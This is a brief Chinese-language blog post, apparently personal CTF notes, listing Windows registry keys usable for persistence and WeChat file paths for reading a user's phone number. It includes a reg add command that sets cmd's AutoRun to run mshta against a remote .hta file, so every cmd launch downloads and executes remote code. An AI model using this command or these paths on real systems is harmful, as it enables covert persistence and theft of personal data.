---
title: 注册表项 
date: 2023-08-29 14:19:49
categories: CTF
tags: [Windows]
---

本文记录那些可以被用来权限维持以及信息探测的注册表项。

## 启动进程

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce` 

用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`



## 下载并执行

```
reg add 'HKCU\Software\Microsoft\Command Processor' 
/v AutoRun /t REG_SZ /d 'mshta.exe' http:/exam/1.hta /f
```

 通过注册表设置命令行默认启动项，当目标启动cmd时，便会下载并执行远程hta文件。 

## SVCHOST

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
```

## 敏感文件

 github.com/xxx/commit/xxxx.patch

http://127.0.0.1:8680/hi

C:\Windows\PFRO.log 

 C:/Users/用户名/Documents/WeChat Files/All Users/config/config.data 

 C:/Users/用户名/Documents/WeChat Files/wx_id/config/AccInfo.dat 读取手机号

```
已经失效 weixin://contacts/profile/wxid_0kdxmrcpsi2x12 
当前需要：https://u.wechat.com/xxx
```

